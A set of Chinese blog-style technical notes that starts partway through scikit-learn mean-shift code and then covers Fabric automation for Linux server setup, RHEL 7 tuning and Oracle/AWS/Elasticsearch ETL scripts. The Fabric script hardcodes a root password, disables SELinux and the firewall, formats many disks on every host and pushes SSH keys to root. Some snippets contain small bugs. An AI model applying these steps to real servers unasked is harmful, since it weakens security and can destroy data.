        ``None`` means 1 unless in a :obj:`joblib.parallel_backend` context.
        ``-1`` means using all processors. See :term:`Glossary <n_jobs>`
        for more details.
        .. versionadded:: 0.17
           Parallel Execution using *n_jobs*.
    Returns
    -------
    cluster_centers : array, shape=[n_clusters, n_features]
        Coordinates of cluster centers.
    labels : array, shape=[n_samples]
        Cluster labels for each point.
    Notes
    -----
    For an example, see :ref:`examples/cluster/plot_mean_shift.py
    <sphx_glr_auto_examples_cluster_plot_mean_shift.py>`.
    """

    if bandwidth is None:
        bandwidth = estimate_bandwidth(X, n_jobs=n_jobs)
    elif bandwidth <= 0:
        raise ValueError("bandwidth needs to be greater than zero or None,\
            got %f" % bandwidth)
    if seeds is None:
        if bin_seeding:
            seeds = get_bin_seeds(X, bandwidth, min_bin_freq)
        else:
            seeds = X
    n_samples, n_features = X.shape
    center_intensity_dict = {}

    # We use n_jobs=1 because this will be used in nested calls under
    # parallel calls to _mean_shift_single_seed so there is no need for
    # for further parallelism.
    nbrs = NearestNeighbors(radius=bandwidth, n_jobs=1).fit(X)

    # execute iterations on all seeds in parallel
    all_res = Parallel(n_jobs=n_jobs)(
        delayed(_mean_shift_single_seed)
        (seed, X, nbrs, max_iter) for seed in seeds)
    # copy results in a dictionary
    for i in range(len(seeds)):
        if all_res[i] is not None:
            center_intensity_dict[all_res[i][0]] = all_res[i][1]

    if not center_intensity_dict:
        # nothing near seeds
        raise ValueError("No point was within bandwidth=%f of any seed."
                         " Try a different seeding strategy \
                         or increase the bandwidth."
                         % bandwidth)

    # POST PROCESSING: remove near duplicate points
    # If the distance between two kernels is less than the bandwidth,
    # then we have to remove one because it is a duplicate. Remove the
    # one with fewer points.

    sorted_by_intensity = sorted(center_intensity_dict.items(),
                                 key=lambda tup: (tup[1], tup[0]),
                                 reverse=True)
    sorted_centers = np.array([tup[0] for tup in sorted_by_intensity])
    unique = np.ones(len(sorted_centers), dtype=np.bool)
    nbrs = NearestNeighbors(radius=bandwidth,
                            n_jobs=n_jobs).fit(sorted_centers)
    for i, center in enumerate(sorted_centers):
        if unique[i]:
            neighbor_idxs = nbrs.radius_neighbors([center],
                                                  return_distance=False)[0]
            unique[neighbor_idxs] = 0
            unique[i] = 1  # leave the current point as unique
    cluster_centers = sorted_centers[unique]

    # ASSIGN LABELS: a point belongs to the cluster that it is closest to
    nbrs = NearestNeighbors(n_neighbors=1, n_jobs=n_jobs).fit(cluster_centers)
    labels = np.zeros(n_samples, dtype=np.int)
    distances, idxs = nbrs.kneighbors(X)
    if cluster_all:
        labels = idxs.flatten()
    else:
        labels.fill(-1)
        bool_selector = distances.flatten() <= bandwidth
        labels[bool_selector] = idxs.flatten()[bool_selector]
    return cluster_centers, labels


代码注释参考：
https://blog.csdn.net/jiaqiangbandongg/article/details/53557500
IsolationForest 异常检测

参考

《数据挖掘与商务智能》-第八章   异常检测 【西安电子科技大学　软件学院】主讲人：黄健斌











大数据系统基本架构： 

1.使用python fabric进行Linux基础配置
使用python，可以让任何事情高效起来，包括运维工作，fabric正式这样一套基于python2的类库，它执行本地或远程shell命令提供了操作的基本套件（正常或通过sudo）和上传/下载文件，如提示用户输入运行辅助功能，或中止执行。
用Python3开发的部署工具叫fabric3：fabric3，和fabric一样最大特点是不用登录远程服务器，在本地运行远程命令，几行Python脚本就可以轻松部署。
典型用途包括创建一个包含一个或多个函数的Python模块，然后通过fab命令行工具执行它们。下面是一个小而全的“fab file”包含一个单独的任务：
from fabric.api import run

def host_type():
    run('uname -s')
执行方法：
 fab -f deploy.py go 

Fabric提供几个简单的API来完成所有的部署，最常用的是local()和run()，分别在本地和远程执行命令，put()可以把本地文件上传到远程，当需要在远程指定当前目录时，只需用with cd(‘/path/to/dir/’):即可。 
默认情况下，当命令执行失败时，Fabric会停止执行后续命令。
有时，我们允许忽略失败的命令继续执行，比如run(‘rm /tmp/abc’)在文件不存在的时候有可能失败，这时可以用with settings(warn_only=True):执行命令，这样Fabric只会打出警告信息而不会中断执行。
Fabric是如何在远程执行命令的呢？其实Fabric所有操作都是基于SSH执行的，必要时它会提示输入口令，所以非常安全。更好的办法是在指定的部署服务器上用证书配置无密码的ssh连接。
更多请fabric参考官方文档，http://www.fabfile.org/
1.1 基建工作基本流程
对于私有云的用户来说，服务器的基建工作比较重要，需要做一些规范化的统一操作，方便后序搭建集群时候服务器上的操作系统有统一的配置，比如CDH,TDH等的集群管理工具，都有这样的要求。
当然，如果是公有云，不用考虑这么多。私有云追赶潮流的话，直接上docker或者openstack就好。下面就是比较low的基建流程，基建工作主要流程为：

修改hostname
关闭sshd
关闭Selinux以及防火墙
重启
格式化磁盘
挂载磁盘
Check上述流程结果。 



1.2 使用anaconda2包（有网环境下准备）
在有网环境下，pip instatll fabric后将anaconda打包 
解压安装到/opt下
tar -xzf anaconda2.tar.gz 
pwd

mkdir python
cd python/
mv ../anaconda2* .

mkdir deployment
cd deployment/

vim deploy.py (copy 下一节的内容)
//在当前命令行上下文，加入anaconda环境变量
ls /opt/python/anaconda2/bin/
PATH=/opt/python/anaconda2/bin;$PATH

1.3 python 代码，deploy.py
#-*- coding: utf-8 -*-

import sys
from fabric.api import *

env.user = 'root'
hostList = []
hostnameprefix='hostname-'
for i in range(1,n):   #ip range
    hostList.append(hostnameprefix + str(i))

env.hosts = hostList
env.password = 'Pass1234'
diskList='bcdefghijklm'

fstabappend='''
/dev/sdb1       /mnt/data01     xfs     defaults        0       0
#.......
/dev/sdc1       /mnt/data02     xfs     defaults        0       0

'''

with open('/root/.ssh/authorized_keys', 'r') as f:
    sshkey = f.read()


def gethostname():
    run('hostname')

# only for RHEL7.2
def changehostname():
    cmd = '''num=`ifconfig| grep your_ip | awk '{print $2}' | cut -d '.' -f 4` && echo hostname-$num > /etc/hostname '''
    run(cmd)

def checksshd():
    cmd = 'grep UseDNS /etc/ssh/sshd_config'
    run(cmd)

# only for RHEL7.2
def disableSSHDNS():
    cmd = '''echo UseDNS no >> /etc/ssh/sshd_config'''
    run(cmd)

def getSelinux():
    cmd = '''grep 'SELINUX=' /etc/selinux/config && getenforce'''
    run(cmd)

def disableSelinux():
    cmd = '''sed -i 's/SELINUX=.*[=A-Za-z]$/SELINUX=disabled/g' /etc/selinux/config'''
    run(cmd)

def getFirewalld():
    cmd = 'systemctl status firewalld'
    run(cmd, warn_only=True)

def disableFirewalld():
    cmd = 'systemctl disable firewalld && systemctl stop firewalld'
    run(cmd)

def checkdiskparted():
    for d in diskList:
        run('''parted /dev/sd%s print ''' % (d))

def parteddisk():
    for d in diskList:
        run('''parted /dev/sd%s mklabel gpt ''' % (d))
        run('''parted /dev/sd%s mkpart primary %s %s''' % (d, '0%', '100%'))

def mkfsdisk():
    for d in diskList:
        run('''mkfs.xfs /dev/sd%s1 ''' % (d))

def mountdisk():
    run('cp /etc/fstab /root/fstab.bak')
    run('''mkdir /mnt/data0{1,2,3,4,5,6,7,8,9} /mnt/data1{0,1,2}''')
    run('echo >> /etc/fstab')
    run('''tee -a /etc/fstab <<EOF%sEOF''' % (fstabappend))
    run('mount -a')

def checkmount():
    run('''df -h | grep '/mnt/data'| wc -l ''')

def checknetspeed():
   run(''' ethtool bond0| grep Speed ''')

@runs_once
def confirm_opetions(message):
    return prompt(message, default='N')

## !!!!!!!!!!!!!! don't to run this function
@task
def rebootall(lhost='default'):
#    if lhost in env.hosts:
#        env.hosts.remove(lhost)
#    else :
#        print('*******************')
#        print('give me the lhost , tell me: who are you?')
#        print('*******************')
#        sys.exit(-1)
#     reboot(use_sudo=False)
    run('shutdown -r +3')

@task
def nopasswd():
    run('mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo "%s" >> /root/.ssh/authorized_keys && chmod 644 /root/.ssh/authorized_keys' % (sshkey))

@task
def go():
    changehostname()
#    disableSSHDNS()
#    disableSelinux()
#    disableFirewalld()
#    mkfsdisk()
#    mountdisk()

@task
def check():
    gethostname()
    checksshd()
    getSelinux()
    getFirewalld()
    checkdiskparted()
    checkmount()
    checknetspeed()


1.4 LINUX 基建使用的命令参考

命令进行ip与主机名字符串的拼接：

num=`ifconfig| grep yourip | awk '{print $2}' | cut -d '.' -f 4` && echo gaibdv1_$num

找到Selinux状态

grep 'SELINUX=' /etc/selinux/config && getenforce

关闭Selinux

sed -i 's/SELINUX=.*[=A-Za-z]$/SELINUX=disabled/g' /etc/selinux/config

格式化磁盘

for d in diskList:
        run('''parted /dev/sd%s mklabel gpt ''' % (d))
        run('''parted /dev/sd%s mkpart primary %s %s''' % (d, '0%', '100%'))

获取网速

ethtool bond0| grep Speed

2. RHEL 7.2 部分优化
2.1 RHEL 7.x系统的闪光点与新特性



XFS文件系统

Linux Container（Docker）



RHEV 3.0 红帽企业级虚拟化


RHEV-M能管理虚拟机与其磁盘镜像，安装ISO，进行高可用性设置，创建虚拟机模板等，这些都能从图形web界面完成。也可使用RHEV-M管理两种类型的hypervisor。RHEV自身带有一个独立的裸机hypervisor，基于RHEL与KVM虚拟化，作为托管的物理节点使用。另外，如果你想从RHEV管理运行在RHEL上的虚拟机，可注册RHEL服务器到RHEV-M控制台。
2.2 部分新旧命令对比



任务
旧命令
新命令



使某服务自动启动
chkconfig –level 3 httpd on
systemctl enable httpd.service


使某服务不自动启动
chkconfig –level 3 httpd off
systemctl disable httpd.service


检查服务状态
service httpd status
systemctl status httpd.service （服务详细信息）systemctl is-active httpd.service （仅显示是否 Active)


显示所有已启动的服务
chkconfig –list
systemctl list-units –type=service


启动某服务
service httpd start
systemctl start httpd.service


停止某服务
service httpd stop
systemctl stop httpd.service


重启某服务
service httpd restart
systemctl restart httpd.service



2.3 更新的命令RHEL7.2 命令更新
一、CentOS的Services使用了systemd来代替sysvinit管理
二、修改系统运行级别
三、其他配置工具

主要是多了systemd这个软件，采用了以下新技术：
采用Socket激活式与总线激活式服务，以提高相互依赖的各服务的并行运行性能； 
用cgroups代替PID来追踪进程，以此即使是两次fork之后生成的守护进程也不会脱离systemd的控制。
Systemd是一个系统管理守护进程、工具和库的集合，用于取代System V初始进程。Systemd的功能是用于集中管理和配置类UNIX系统。主要负责控制systemd系统和服务管理器。从设计构思上说，由于systemd使用了cgroup与fanotify等组件以实现其特性，所以只适用于Linux。
在Linux生态系统中，Systemd被部署到了大多数的标准Linux发行版中，只有为数不多的几个发行版尚未部署。Systemd通常是所有其它守护进程的父进程，但并非总是如此。

其他请看参考7。
2.4 优化配置 (未完待续。。。)
可能优化的地方

更新系统

 yum  update -y

给/etc/rc.local添加执行权限

chmod +x /etc/rc.d/rc.local

加大打开文件数的限制（open files）

ulimit -n
ulimit -a
vi /etc/security/limits.conf
最后添加
* soft nofile 1024000
* hard nofile 1024000
hive   - nofile 1024000
hive   - nproc  1024000

用户进程限制
# sed -i 's#4096#65535#g'   /etc/security/limits.d/20-nproc.conf  #加大普通用户限制  也可以改为unlimited
#  egrep -v "^$|^#" /etc/security/limits.d/20-nproc.conf        
*          soft    nproc     65535
root       soft    nproc     unlimited

reboot

优化内核

cat /etc/sysctl.conf
#CTCDN系统优化参数
#关闭ipv6
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
#决定检查过期多久邻居条目
net.ipv4.neigh.default.gc_stale_time=120
#使用arp_announce / arp_ignore解决ARP映射问题
net.ipv4.conf.default.arp_announce = 2
net.ipv4.conf.all.arp_announce=2
net.ipv4.conf.lo.arp_announce=2
# 避免放大攻击
net.ipv4.icmp_echo_ignore_broadcasts = 1
# 开启恶意icmp错误消息保护
net.ipv4.icmp_ignore_bogus_error_responses = 1
#关闭路由转发
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
#开启反向路径过滤
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
#处理无源路由的包
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
#关闭sysrq功能
kernel.sysrq = 0
#core文件名中添加pid作为扩展名
kernel.core_uses_pid = 1
# 开启SYN洪水攻击保护
net.ipv4.tcp_syncookies = 1
#修改消息队列长度
kernel.msgmnb = 65536
kernel.msgmax = 65536
#设置最大内存共享段大小bytes
kernel.shmmax = 68719476736
kernel.shmall = 4294967296
#timewait的数量，默认180000
net.ipv4.tcp_max_tw_buckets = 6000
net.ipv4.tcp_sack = 1
net.ipv4.tcp_window_scaling = 1
net.ipv4.tcp_rmem = 4096        87380   4194304
net.ipv4.tcp_wmem = 4096        16384   4194304
net.core.wmem_default = 8388608
net.core.rmem_default = 8388608
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216
#每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许送到队列的数据包的最大数目
net.core.netdev_max_backlog = 262144
#限制仅仅是为了防止简单的DoS 攻击
net.ipv4.tcp_max_orphans = 3276800
#未收到客户端确认信息的连接请求的最大值
net.ipv4.tcp_max_syn_backlog = 262144
net.ipv4.tcp_timestamps = 0
#内核放弃建立连接之前发送SYNACK 包的数量
net.ipv4.tcp_synack_retries = 1
#内核放弃建立连接之前发送SYN 包的数量
net.ipv4.tcp_syn_retries = 1
#启用timewait 快速回收
net.ipv4.tcp_tw_recycle = 1
#开启重用。允许将TIME-WAIT sockets 重新用于新的TCP 连接
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_mem = 94500000 915000000 927000000
net.ipv4.tcp_fin_timeout = 1
#当keepalive 起用的时候，TCP 发送keepalive 消息的频度。缺省是2 小时
net.ipv4.tcp_keepalive_time = 1800
net.ipv4.tcp_keepalive_probes = 3
net.ipv4.tcp_keepalive_intvl = 15
#允许系统打开的端口范围
net.ipv4.ip_local_port_range = 1024    65000
#修改防火墙表大小，默认65536
net.netfilter.nf_conntrack_max=655350
net.netfilter.nf_conntrack_tcp_timeout_established=1200
# 确保无人能修改路由表
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.default.secure_redirects = 0


本文出自 “兰芷” 博客，请务必保留此出处http://7826443.blog.51cto.com/7816443/1775248
sysctl -p  #生效

vim基本设置

 vim  /root/.vimrc
set history=1000
autocmd InsertLeave * se cul
autocmd InsertLeave * se nocul
set nu
set bs=2
syntax on
set laststatus=2
set tabstop=4
set go=
set ruler
set showcmd
set cmdheight=1
hi CursorLine   cterm=NONE ctermbg=blue ctermfg=white guibg=blue guifg=white
set hls
set cursorline
set ignorecase
set hlsearch
set incsearch
set helplang=cn


inoremap ( ()<ESC>i       
inoremap [ []<ESC>i
inoremap { {}<ESC>i
inoremap < <><ESC>i
inoremap " ""<ESC>i
inoremap ' ''<ESC>i

日志系统简介
在rhel7系统中有两个日志服务，分别是：

rsyslog
systemd-journal

systemd-journald是一个改进型日志管理服务，可以收集来自内核、系统早期启动阶段的日志、系统守护进程在启动和运行中的标准输出和错误信息，还有syslog的日志。该日志服务仅仅把日志集中保存在单一结构的日志文件/run/log中，由于日志是经历过压缩和格式化的二进制数据，所以在查看和定位的时候很迅速。默认情况下并不会持久化保存日志，只会保留一个月的日志。另外，一些rsyslog无法收集的日志也会被journal记录到。
rsyslog作为传统的系统日志服务，把所有收集到的日志都记录到/var/log/目录下的各个日志文件中。常见的日志文件如下：
/var/log/messages 绝大多数的系统日志都记录到该文件

/var/log/secure 所有跟安全和认证授权等日志都会记录到此文件

/var/log/maillog 邮件服务的日志

/var/log/cron crond计划任务的日志

/var/log/boot.log 系统启动的相关日志
linux命令大全
http://man.linuxde.net/

参考文献
1.官方文档 
http://www.fabfile.org/
2.参考 
http://wklken.me/posts/2013/03/25/python-tool-fabric.html
3.python3中使用fabric3
https://github.com/mathiasertl/fabric/ 
pip install Fabric3
4.关闭UseDNS加速SSH登录
经常登陆SSH的朋友可以感觉出，每次登录SSH时总是要停顿等待一下才能连接上，,这是因为OpenSSH服务器有一个DNS查找选项UseDNS默认情况下是打开的。 
UseDNS 选项打开状态下，当客户端试图登录SSH服务器时，服务器端先根据客户端的IP地址进行DNS PTR反向查询出客户端的主机名，然后根据查询出的客户端主机名进行DNS正向A记录查询，验证与其原始IP地址是否一致，这是防止客户端欺骗的一种措施，但一般我们的是动态IP不会有PTR记录，打开这个选项不过是在白白浪费时间而已，不如将其关闭。
http://www.kwx.gd/CentOSApp/Centos-SSH-UseDNS.html
6.fabric使用简单例子，中文： 
http://www.cnblogs.com/MacoLee/p/5680672.html 
另一个参考： 
http://blog.csdn.net/wklken/article/details/8719541/
7.RHEL 一些改变
http://www.ha97.com/5657.html 
https://linux.cn/article-5926-1.html
8.优化RHEL
http://hequan.blog.51cto.com/5701886/1789146/
9.日志 
http://www.linuxidc.com/Linux/2016-01/127729.htm 
http://blog.csdn.net/sinat_34689375/article/details/53789592 
https://blog.linuxeye.cn/400.html
 









文章大纲大数据ETL 系列文章简介1. oracle数据泵 导入导出实战1.1 数据库创建1.2. installs Oracle1.3 export / import data from oracle2.  将数据库表导出成 CSV, 并批量上传至 AWS2.1 export all table to CSV2.2 upload csv to aws3.本地文件导入aws elastic search4. oracle table-视图 windows 批处理 导出4.1 使用win32 脚本调用sqlplus 导出视图4.2 使用python 执行视图导出5.spark dataframe 数据导入Elasticsearch5.1 dataframe 及环境初始化5.2 清洗及写入数据

大数据ETL 系列文章简介
本系列文章主要针对ETL大数据处理这一典型场景，基于python语言使用Oracle、aws、Elastic search 、Spark 相关组件进行一些基本的数据导入导出实战，如：

oracle使用数据泵impdp进行导入操作。
aws使用awscli进行上传下载操作。
本地文件上传至aws es
spark dataframe录入ElasticSearch

等典型数据ETL功能的探索。
系列文章：
1.大数据ETL实践探索（1）---- python 与oracle数据库导入导出
2.大数据ETL实践探索（2）---- python 与aws 交互
3.大数据ETL实践探索（3）---- pyspark 之大数据ETL利器
4.大数据ETL实践探索（4）---- 之 搜索神器elastic search
5.使用python对数据库，云平台，oracle，aws，es导入导出实战
6.aws ec2 配置ftp----使用vsftp

本文主要使用python基于oracle和aws 相关组件进行一些基本的数据导入导出实战，oracle使用数据泵impdp进行导入操作，aws使用awscli进行上传下载操作。本地文件上传至aws es，spark dataframe录入ElasticSearch等典型数据ETL功能的探索。

1. oracle数据泵 导入导出实战
1.1 数据库创建
本文主要使用最新版本的oracle 12c，如果创建oracle数据库时候使用了数据库容器（CDB）承载多个可插拔数据库（PDB）的模式，那么数据库的用户名需要用c##开头，使用数据泵进行操作 的时候也有一些不同：
在CDB中，只能创建以c##或C##开头的用户，如果不加c##，则会提示错误“ORA-65096：公用用户名或角色名无效”,只有在PDB数据库中才能创建我们习惯性命名的用户，oracle称之为Local User,前者称之为Common User。
创建的时候不要勾选：

https://www.cnblogs.com/xqzt/p/5034261.html
https://www.cnblogs.com/fanyongbin/p/5699482.html

1.2. installs Oracle
Download and install Oracle 12C,
Http://www.oracle.com/technetwork/database/enterprise-edition/downloads/index.html
Under windows10, use sqlplus to log in
you should first

set oracle_sid=orcl

Sqlplus /nolog

conn /as SYSDBA

Creating a user
Syntax [creating the user]:
create user username identified by password [that is the password];

E.g.
Create user [username] identified by [password];

Default tablespace [tablespacename]

Temporary tablespace temp;

Grant DBA to username;

.
由于全库导入的时候oracle_home和之前的数据库发生了改变，所以原来数据库的表空间需要提前建立。可以根据导出日志或者导入日志的报错，查看原来数据库中到底有那些表空间。特别注意有关视图和索引的表空间和用户也需要提起建立好。当然如果你只要数据的话就不太影像了。基本上使用表空间就可以全部导入。
Create table space :
E.g
Create tablespace xxx datafile'f:\xxx.dbf'size 200M AUTOEXTEND on;


1.3 export / import data from oracle
从oracle库中导出 数据可以使用oracle数据泵程序，全库导出实例如下：

Expdp username/password FULL=y DUMPFILE=dpump_dir1:full1%U.dmp, dpump_dir2:full2%U.dmp

FILESIZE=2G PARALLEL=3 LOGFILE=dpump_dir1:expfull.log JOB_NAME=job


以下命令的导入并不是全库导入，如果需要全库导入的话，由于oracle_home 的改变，需要提前建立好用户和表空间，以及索引的表空间，视图的用户等
command as follow:
Impdp username/password@orcl full=y directory=dir_yiliao dumpfile=full1%U.dmp remap_schema=username_old:username_new exclude=GRANT remap_tablespace='(t1:tempt1, t2:tempt2) '  tablespaces=tempt1,temp2

以下两种导入方式只能二选一：

full=y
tablespaces=tempt1,temp2

整体说明
https://www.2cto.com/database/201605/508212.html

2.  将数据库表导出成 CSV, 并批量上传至 AWS
2.1 export all table to CSV
使用oracle函数 utl_file  进行快速导入导出（一分钟300万条的量级），这个比spool快多啦
CREATE OR REPLACE PROCEDURE SQL_TO_CSV
(
 P_QUERY IN VARCHAR2, -- PLSQL文
 P_DIR IN VARCHAR2, -- 导出的文件放置目录
 P_FILENAME IN VARCHAR2 -- CSV名
 )
 IS
  L_OUTPUT UTL_FILE.FILE_TYPE;
  L_THECURSOR INTEGER DEFAULT DBMS_SQL.OPEN_CURSOR;
  L_COLUMNVALUE VARCHAR2(4000);
  L_STATUS INTEGER;
  L_COLCNT NUMBER := 0;
  L_SEPARATOR VARCHAR2(1);
  L_DESCTBL DBMS_SQL.DESC_TAB;
  P_MAX_LINESIZE NUMBER := 32000;
BEGIN
  --OPEN FILE
  L_OUTPUT := UTL_FILE.FOPEN(P_DIR, P_FILENAME, 'W', P_MAX_LINESIZE);
  --DEFINE DATE FORMAT
  EXECUTE IMMEDIATE 'ALTER SESSION SET NLS_DATE_FORMAT=''YYYY-MM-DD HH24:MI:SS''';
  --OPEN CURSOR
  DBMS_SQL.PARSE(L_THECURSOR, P_QUERY, DBMS_SQL.NATIVE);
  DBMS_SQL.DESCRIBE_COLUMNS(L_THECURSOR, L_COLCNT, L_DESCTBL);
  --DUMP TABLE COLUMN NAME
  FOR I IN 1 .. L_COLCNT LOOP
    UTL_FILE.PUT(L_OUTPUT,L_SEPARATOR || '"' || L_DESCTBL(I).COL_NAME || '"'); --输出表字段
    DBMS_SQL.DEFINE_COLUMN(L_THECURSOR, I, L_COLUMNVALUE, 4000);
    L_SEPARATOR := ',';
  END LOOP;
  UTL_FILE.NEW_LINE(L_OUTPUT); --输出表字段
  --EXECUTE THE QUERY STATEMENT
  L_STATUS := DBMS_SQL.EXECUTE(L_THECURSOR);
 
  --DUMP TABLE COLUMN VALUE
  WHILE (DBMS_SQL.FETCH_ROWS(L_THECURSOR) > 0) LOOP
    L_SEPARATOR := '';
    FOR I IN 1 .. L_COLCNT LOOP
      DBMS_SQL.COLUMN_VALUE(L_THECURSOR, I, L_COLUMNVALUE);
      UTL_FILE.PUT(L_OUTPUT,
                  L_SEPARATOR || '"' ||
                  TRIM(BOTH ' ' FROM REPLACE(L_COLUMNVALUE, '"', '""')) || '"');
      L_SEPARATOR := ',';
    END LOOP;
    UTL_FILE.NEW_LINE(L_OUTPUT);
  END LOOP;
  --CLOSE CURSOR
  DBMS_SQL.CLOSE_CURSOR(L_THECURSOR);
  --CLOSE FILE
  UTL_FILE.FCLOSE(L_OUTPUT);
EXCEPTION
  WHEN OTHERS THEN
    RAISE;
END;
 
/


创建数据库目录
sql>create or replace directory OUT_PATH as 'D:\';

运行以下sql
SELECT 'EXEC sql_to_csv(''select * from ' ||T.TABLE_NAME ||''',''OUT_PATH''' || ',''ODS_MDS.' || T.TABLE_NAME ||'.csv'');' FROM user_TABLES T where t.TABLE_NAME='表名'

得到以下的批量sql，导出来，生成.sql脚本,在命令行中执行即可.
EXEC sql_to_csv('select * from table1','OUT_PATH','table1.csv');
EXEC sql_to_csv('select * from table2','OUT_PATH','table2.csv');

For reference, the links are as follows
Https://blog.csdn.net/huangzhijie3918/article/details/72732816
2.2 upload csv to aws
使用awscli上传大文件，当然直接浏览器上传也行，但是好像超过4g会有问题。
Download Windows Installer
Https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/awscli-install-windows.html#awscli-install-windows-path
When installed, use
AWS --version

to confirm whether it is normal
Single file upload eg.
AWS S3 --region cn-north-1 CP CL_CLLI_LOG.csv s3://xxxx/csv/

You can use the notepad++'s block pattern, edit each table into a command, and execute the bat file in the CMD,like below:
aws s3 --region cn-north-1 cp LOG1.csv s3://xxxx/csv/ 
aws s3 --region cn-north-1 cp LOG2.csv s3://xxxx/csv/ 



3.本地文件导入aws elastic search
修改访问策略，设置本地电脑的公网ip，这个经常会变化，每次使用时候需要设置一下

安装anancota
https://www.anaconda.com/download/
初始化环境，win10下打开Anaconda Prompt 的命令行

conda create -n elasticsearch python=3.6
source activate elasticsearch 
pip install elasticsearch
pip install pandas


使用脚本如下：windows获取当前文件夹下所有csv并建立索引入es


from elasticsearch import helpers, Elasticsearch
import pandas as pd
from time import time

import win_unicode_console
win_unicode_console.enable()

import os  
  
def file_name(file_dir):   
    for root, dirs, files in os.walk(file_dir):  
        print(root) #当前目录路径  
        print(dirs) #当前路径下所有子目录  
        print(files) #当前路径下所有非目录子文件  
        return [item for item in files if '.csv' in item]


root_path=os.getcwd()+'\\'

fileslist = file_name(root_path)

# size of the bulk
chunksize=50000

for file in fileslist:
    t0=time()
    f = open(root_path+file,'r', encoding='UTF-8') # read csv

    # 使用 pandas 解析csv
    csvfile=pd.read_csv(f, iterator=True, chunksize=chunksize,low_memory=False) 

    # 初始化es
    es = Elasticsearch(["https://yoururl.amazonaws.com.cn"])

    # 初始化索引
    try :
        es.indices.delete(file.strip('.csv').lower())
    except :
        pass

    es.indices.create(file.strip('.csv').lower())

    # start bulk indexing 
    print("now indexing %s..."%(file))

    for i,df in enumerate(csvfile): 
        print(i)
        records=df.where(pd.notnull(df), None).T.to_dict()
        list_records=[records[it] for it in records]
        try :
            helpers.parallel_bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower(),thread_count=8)
        except :
            print("error!, skip records...")
            pass

    print("done in %.3fs"%(time()-t0))


上一段代码发现，数据录入es时候有问题，由于并行录入是懒加载的模式，所以数据居然没录进去，按照下面链接提供的思路，代码需要如下修改：
代码实例：
https://www.programcreek.com/python/example/104891/elasticsearch.helpers.parallel_bulk
参考帖子：
https://discuss.elastic.co/t/helpers-parallel-bulk-in-python-not-working/39498

from elasticsearch import helpers, Elasticsearch
import pandas as pd
from time import time

from elasticsearch.helpers import BulkIndexError
from elasticsearch.exceptions import TransportError,ConnectionTimeout,ConnectionError
import traceback  
import logging
logging.basicConfig(filename='log-for_.log',
                    format='%(asctime)s -%(name)s-%(levelname)s-%(module)s:%(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S %p',
                    level=logging.ERROR)


import win_unicode_console
win_unicode_console.enable()

import os  
  
def file_name(file_dir):   
    for root, dirs, files in os.walk(file_dir):  
        print(root) #当前目录路径  
        print(dirs) #当前路径下所有子目录  
        print(files) #当前路径下所有非目录子文件  
        return [item for item in files if '.csv' in item]

#NAME = "PV_PROV_LOG"
root_path=os.getcwd()+'\\'
#csv_filename="%s.csv" % NAME



fileslist = file_name(root_path)

# size of the bulk
chunksize=1000

for file in fileslist:

    t0=time()
    # open csv file
    
    f = open(root_path+file,'r', encoding='UTF-8') # read csv

    # parse csv with pandas
    csvfile=pd.read_csv(f, iterator=True, chunksize=chunksize,low_memory=False) 

    # init ElasticSearch
    es = Elasticsearch(["..."])

    # init index
    try :
        es.indices.delete(file.strip('.csv').lower())
    except :
        pass

    es.indices.create(file.strip('.csv').lower())

    # start bulk indexing 
    print("now indexing %s..."%(file))

    for i,df in enumerate(csvfile): 
        print(i)
        records=df.where(pd.notnull(df), None).T.to_dict()
        list_records=[records[it] for it in records]
        #print(list_records)
        try :
            #helpers.bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower())
            for success, info in helpers.parallel_bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower(),thread_count=8):
                if not success:
                    print('A document failed:', info)
            #helpers.parallel_bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower(),thread_count=8)
        except ConnectionTimeout:
            logging.error("this is ES ConnectionTimeout ERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
        except TransportError:
            
            logging.error("this is ES TransportERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
        except ConnectionError:
            logging.error("this is ES ConnectionError ERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
            
        except BulkIndexError:
            logging.error("this is ES BulkIndexError ERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
            pass
        except Exception:
            logging.error("exception not match \n %s"%str(traceback.format_exc()))
            logging.error('retry bulk es')
            pass
        except :
            print("error!, skiping some records")
            print (list_records)
            print(json.loads(result))
            pass

    print("done in %.3fs"%(time()-t0))



4. oracle table-视图 windows 批处理 导出
4.1 使用win32 脚本调用sqlplus 导出视图
输入年月等信息，拼接字符串导出表, 下面 的脚本可以循环接受输入
@echo off
:begin
::年份
set input_year=
set /p input_year=Please input year :
::月份
set input_month=
set /p input_month=Please input month :

::字符串前缀
set prefix=ex_vw_
::字符串拼接

set "table_name=%prefix%%input_year%%input_month%"

echo Your input table_name:%table_name%
echo Your input time:%input_year%-%input_month%

::sqlplus 执行sql脚本 后带参数
sqlplus username/password@ip/instanceNname @createtable.sql %table_name% %input_year%-%input_month%



rem pause>null

goto begin

以下sql脚本为createtable.sql，接受两个参数，写做：&1 ，&2 …如果多个参数可以依次写下去。

drop table &1;

create table &1 as select * from some_table_view where incur_date_from = to_date('&2-01','yyyy-mm-dd');

Insert into &1 select * from some_table_view where incur_date_from = to_date('&2-02','yyyy-mm-dd');

commit;
quit;

后来发现一个问题，比如上面的第2小节的存储过程 SQL_TO_CSV，死活没法成功执行，只好安装cx_oracle ,用python 导出了，代码如下。
4.2 使用python 执行视图导出
主要逻辑是，按照月份 ，执行视图生成这个月每天的数据插入到表中，当一个月的数据执行完毕，将这个月份表导出。
类似这种流程化的东西，python果然还是利器
